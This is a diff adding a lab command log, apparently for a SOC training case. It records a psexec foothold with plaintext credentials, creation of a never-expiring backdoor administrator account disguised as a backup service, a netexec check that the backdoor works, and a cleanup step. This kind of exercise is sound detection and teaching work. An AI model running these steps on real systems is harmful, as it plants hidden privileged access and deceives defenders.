@@ -1,0 +1,28 @@
+# Kali commands — SOC-Case-Account-Creation (192.168.100.106 -> 192.168.100.108)
+# Actual commands run.
+
+# Foothold: SYSTEM shell
+impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
+#   v0.14.0 — ADMIN$ upload DmmYUPVU.exe, service Wlug -> C:\Windows\system32>
+
+# --- inside psexec shell ---
+
+# Create masqueraded backdoor account (never expires)
+net user svc_backup "B@ckupSvc2026!" /add /fullname:"Backup Service Account" /comment:"Service account for automated backup" /expires:never
+#   The command completed successfully.
+
+# Add to Administrators (privilege persistence)
+net localgroup Administrators svc_backup /add
+#   The command completed successfully.
+
+# Verify
+net user svc_backup
+#   Account active: Yes, Account expires: Never, Local Group Memberships: *Administrators *Users
+net localgroup Administrators
+
+# --- from Kali (new terminal) — prove backdoor works ---
+netexec smb 192.168.100.108 -u svc_backup -p 'B@ckupSvc2026!'
+#   [+] DESKTOP-F0JVTQT\svc_backup:B@ckupSvc2026! (Pwn3d!)
+
+# Cleanup (lab)
+net user svc_backup /delete
